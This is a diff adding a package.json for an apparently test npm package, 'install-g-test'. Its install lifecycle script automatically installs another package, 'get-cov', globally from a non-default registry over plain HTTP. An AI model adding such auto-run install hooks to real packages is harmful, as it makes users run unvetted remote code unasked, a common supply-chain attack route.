@@ -1,0 +1,14 @@
+{
+  "name": "install-g-test",
+  "version": "2.0.12",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "install": "npm install -g get-cov --registry http://dev-npm.qapint.com/",
+    "postuninstall": "npm r -g get-cov && exit 0"
+  },
+  "bin": "./bin/index.js",
+  "author": "",
+  "license": "ISC"
+}
